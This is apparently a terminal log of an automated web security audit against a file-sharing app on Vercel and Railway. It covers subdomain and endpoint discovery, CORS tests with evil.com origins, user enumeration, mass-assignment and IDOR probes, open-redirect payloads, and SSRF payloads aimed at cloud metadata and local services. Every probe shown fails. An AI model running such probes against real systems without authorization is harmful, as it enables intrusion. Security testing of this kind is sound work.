+admin-production-c8591.up.railway.app → 69.46.46.75
+web-production-c8591.up.railway.app → 69.46.46.26
+prod-production-c8591.up.railway.app → 69.46.46.119
+dev-production-c8591.up.railway.app → 69.46.46.127
+staging-production-c8591.up.railway.app → 69.46.46.52
+
+──────── FASE 2: FRONTEND ────────
+[2.1] Homepage + route map
+  /                              200
+  /drives                        200
+  /share/create                  200
+  /files                         404
+  /dashboard                     404
+  /admin                         404
+  /login                         404
+  /register                      404
+  /auth/login                    404
+  /auth/register                 404
+  /auth/change-password          404
+  /files/upload                  404
+  /files/stats                   404
+  /drives/pool                   404
+  /drives/refresh-quota          404
+  /oauth/google/connect          404
+  /conversions/jobs              404
+  /api/user                      404
+  /api/me                        404
+[2.2] Crawl JS (katana)
+https://clouddatadprd.vercel.app
+https://clouddatadprd.vercel.app/static/immutable/chunks/3se2njap-g0ob.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/11tdyw36dsds6.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/05wvx7n-m_kzt.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/1cs_udexqul39.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/3mw-hrby2crkm.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/1ae7t663d-y21.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/43ec2xeuyqldy.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/0c0hxoamwjsbw.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/turbopack-1cvbnb3nlabgn.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/static/immutable/chunks/1faqho694lhlf.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/3h-55frbe8d0r.js
+https://clouddatadprd.vercel.app/share/create
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/2hv1sro5qow6d.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/image/
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/video/
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/audio/
+https://clouddatadprd.vercel.app/drives/
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/1cgyfy_4rnpyi.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/3se2njap-g0ob.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/2c_2b2prcozy6.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/2apz3jtqratg0.js
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/18c61ulh2b5r5.css
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/3su8njy7pvdpd.css
+https://clouddatadprd.vercel.app/_next/static/immutable/chunks/0i036eg27f18o.js
+25 recon/urls.txt
+[2.3] Download semua JS
+  Downloaded: 33 files
+[2.4] Extract endpoints dari JS
+  Endpoints found: 19
+/assignments/
+/assignments/my
+/auth/change-password
+/auth/login
+/auth/register
+/categories/
+/collaborators/
+/conversions/
+/conversions/jobs
+/conversions/operations
+/drives/
+/drives/pool
+/drives/refresh-quota
+/files/
+/files/stats
+/files/upload
+/oauth/google/connect
+/share/
+/share/create
+[2.5] External URLs + secrets
+https://web-production-c8591.up.railway.app
+  Google keys: 0, JWTs: 0
+NEXT_PUBLIC_API_URL
+
+──────── FASE 3: BACKEND PROBE ────────
+[3.1] Test endpoint dengan & tanpa /api prefix
+/assignments/                                 → 405 (31 bytes)
+/assignments/my                               → 401 (30 bytes)
+/auth/change-password                         → 405 (31 bytes)
+/auth/login                                   → 405 (31 bytes)
+/auth/register                                → 405 (31 bytes)
+/categories/                                  → 401 (30 bytes)
+/collaborators/                               → 401 (30 bytes)
+/conversions/                                 → 405 (31 bytes)
+/conversions/jobs                             → 401 (30 bytes)
+/conversions/operations                       → 200 (1631 bytes)
+/drives/                                      → 401 (30 bytes)
+/drives/pool                                  → 401 (30 bytes)
+/drives/refresh-quota                         → 405 (31 bytes)
+/files/                                       → 401 (30 bytes)
+/files/stats                                  → 401 (30 bytes)
+/files/upload                                 → 405 (31 bytes)
+/oauth/google/connect                         → 401 (30 bytes)
+/share/create                                 → 405 (31 bytes)
+[3.2] Root + health check
+  /               200
+  /health         200
+  /api            404
+  /api/health     404
+  /status         404
+  /version        404
+
+──────── FASE 4: CORS EXPLOITATION ────────
+=== Origin: https://evil.com ===
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+=== Origin: https://attacker.vercel.app ===
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+=== Origin: null ===
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+=== Origin: https://clouddatadprd.vercel.app ===
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+=== Origin: http://localhost:3000 ===
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+ access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+
+[4.1] VERDICT CORS
+  ℹ️  Perlu analisis manual (lihat api/cors-matrix.txt)
+
+──────── FASE 5: AUTH / IDOR / MASS-ASSIGN ────────
+  Auth endpoint: /auth/login
+bash: !\: event not found
+[5.1] Login test — user enumeration
+  admin                          → [422]
+  test                           → [422]
+  user@test.com                  → [401]
+  admin@clouddatadprd.local      → [422]
+[5.2] Mass assignment register
+  role=admin → 422
+  role=superadmin → 422
+  role=root → 422
+[5.3] IDOR — endpoint dengan ID
+  /files/1 → 405 (31 bytes)
+  /files/2 → 405 (31 bytes)
+  /files/0 → 405 (31 bytes)
+  /files/admin → 405 (31 bytes)
+  /files/test → 405 (31 bytes)
+  /files/00000000 → 405 (31 bytes)
+  /drives/1 → 405 (31 bytes)
+  /drives/2 → 405 (31 bytes)
+  /drives/0 → 405 (31 bytes)
+  /drives/admin → 405 (31 bytes)
+  /drives/test → 405 (31 bytes)
+  /drives/00000000 → 405 (31 bytes)
+  /share/1 → 405 (31 bytes)
+  /share/2 → 405 (31 bytes)
+  /share/0 → 405 (31 bytes)
+  /share/admin → 405 (31 bytes)
+  /share/test → 405 (31 bytes)
+  /share/00000000 → 405 (31 bytes)
+  /assignments/1 → 405 (31 bytes)
+  /assignments/2 → 405 (31 bytes)
+  /assignments/0 → 405 (31 bytes)
+  /assignments/admin → 405 (31 bytes)
+  /assignments/test → 405 (31 bytes)
+  /assignments/00000000 → 405 (31 bytes)
+  /collaborators/1 → 405 (31 bytes)
+  /collaborators/2 → 405 (31 bytes)
+  /collaborators/0 → 405 (31 bytes)
+  /collaborators/admin → 405 (31 bytes)
+  /collaborators/test → 405 (31 bytes)
+  /collaborators/00000000 → 405 (31 bytes)
+  /categories/1 → 405 (31 bytes)
+  /categories/2 → 405 (31 bytes)
+  /categories/0 → 405 (31 bytes)
+  /categories/admin → 405 (31 bytes)
+  /categories/test → 405 (31 bytes)
+  /categories/00000000 → 405 (31 bytes)
+
+──────── FASE 6: SERVER ACTION ────────
+[6.1] Extract action ID dari RSC payload
+  Action IDs: 0
+[6.2] Test Server Action — SSRF payload
+  Tidak ada Action ID ter-extract (App Router pakai ID terenkripsi, normal)
+
+──────── FASE 7: OAUTH / SSRF ────────
+[7.1] OAuth connect — open redirect test
+  redirect=https://evil.com → 401
+  redirect=//evil.com → 401
+  redirect=https://clouddatadprd.vercel.app@evil.com → 401
+[7.2] SSRF via oauth
+  url=http://169.254.169.254/latest/meta-data/ → 405
+  url=http://127.0.0.1:6379/ → 405
+  url=http://localhost:22 → 405
+
+──────── FASE 8: NUCLEI SCAN ────────
+
+  FE findings: 0
+  BE findings: 0
+
+──────── FASE 9: SUMMARY ────────
+✅ Selesai. Laporan: report/FINAL-20261104-160116.md
+📋 Log:      logs/master-20261104-160116.log
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+
